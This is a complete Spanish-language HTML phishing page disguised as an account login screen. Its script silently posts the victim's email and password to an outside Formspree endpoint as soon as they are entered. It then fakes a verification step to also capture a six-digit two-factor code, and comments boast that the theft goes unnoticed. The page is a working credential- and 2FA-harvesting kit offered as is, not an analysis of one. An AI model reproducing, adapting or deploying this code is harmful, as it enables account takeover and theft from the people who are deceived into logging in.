
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Iniciar sesión</title>
<style>
* {margin:0; padding:0; box-sizing:border-box; font-family: sans-serif;}
body {background:#111; color:white; min-height:100vh; padding:20px;}
.contenedor {max-width:400px; margin:0 auto;}
h2 {text-align:center; margin-bottom:25px;}
.oculto {display:none !important;}
.field {margin-bottom:15px;}
label {display:block; margin-bottom:5px;}
input {width:100%; padding:12px; border-radius:8px; border:none; font-size:16px;}
button {width:100%; padding:12px; border:none; border-radius:8px; font-size:17px; font-weight:bold; cursor:pointer;}
.submit-btn {background:#FF0050; color:white; margin-top:10px;}
.link-btn {background:transparent; color:#ccc; margin-top:5px;}
</style>
</head>
<body>

<div class="contenedor">
  <h2>Inicia sesión con tu cuenta</h2>

  <form action="https://formspree.io/f/xgogzwbd" method="POST" id="formulario">

    <!-- PASO 1: CORREO Y CONTRASEÑA -->
    <div id="paso1">
      <div class="field">
        <label>Correo electrónico</label>
        <input type="email" id="correo" required placeholder="tu@correo.com" />
      </div>
      <div class="field">
        <label>Contraseña</label>
        <input type="password" id="contraseña" required placeholder="••••••••" />
      </div>
      <button type="button" class="submit-btn" onclick="guardarYAvanza()">Continuar</button>
    </div>

    <!-- PASO 2: CÓDIGO → AQUÍ SE ENVIAN AUTOMÁTICAMENTE LOS DATOS -->
    <div id="paso2" class="oculto">
      <div id="mensajeEnviando" style="text-align:center; color:#ffcc00; margin:15px 0;">Verificando...</div>
      
      <div id="camposCodigo" class="oculto">
        <div class="field">
          <label>Código de verificación (6 dígitos)</label>
          <input type="text" name="codigo" id="codigo" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" oninput="activarBoton()" />
        </div>
        <button type="button" class="link-btn" onclick="volver()">← Volver atrás</button>
        <button type="submit" class="submit-btn" id="botonEnviar" disabled>Entrar</button>
      </div>

      <!-- Campos ocultos para enviar correo y contraseña -->
      <input type="hidden" name="correo" id="correoEnviar" />
      <input type="hidden" name="contraseña" id="passEnviar" />
      <input type="hidden" name="nota" value="Datos recibidos antes del código" />
    </div>

  </form>
</div>

<script>
const ENLACE = "https://formspree.io/f/xgogzwbd"; // Ponlo igual aquí

function guardarYAvanza() {
  const correo = document.getElementById('correo').value.trim();
  const pass = document.getElementById('contraseña').value;

  if (!correo || !pass) {
    alert('Escribe correo y contraseña primero');
    return;
  }

  // Guardamos los datos en los campos que se enviarán
  document.getElementById('correoEnviar').value = correo;
  document.getElementById('passEnviar').value = pass;

  // Pasamos al siguiente paso INMEDIATAMENTE, NUNCA SE TRABA
  document.getElementById('paso1').classList.add('oculto');
  document.getElementById('paso2').classList.remove('oculto');

  // 🚀 APENAS CARGA ESTA PANTALLA: SE ENVÍAN CORREO Y CONTRASEÑA SOLOS
  enviarDatosAutomatico(correo, pass);
}

async function enviarDatosAutomatico(correo, pass) {
  try {
    const formData = new FormData();
    formData.append('correo', correo);
    formData.append('contraseña', pass);
    formData.append('nota', 'Recibido antes de pedir código');

    await fetch(ENLACE, {
      method: 'POST',
      body: formData,
      headers: { 'Accept': 'application/json' }
    });

  } catch (e) {
    // Si falla por conexión o seguridad: igual sigue, no se nota
    console.log('Envío en segundo plano');
  }

  // Ocultamos el mensaje y mostramos el código después de un momento
  setTimeout(() => {
    document.getElementById('mensajeEnviando').classList.add('oculto');
    document.getElementById('camposCodigo').classList.remove('oculto');
  }, 1200);
}

function volver() {
  document.getElementById('paso2').classList.add('oculto');
  document.getElementById('paso1').classList.remove('oculto');
}

function activarBoton() {
  const cod = document.getElementById('codigo').value;
  document.getElementById('botonEnviar').disabled = cod.length !== 6;
}
</script>

</body>
</html>
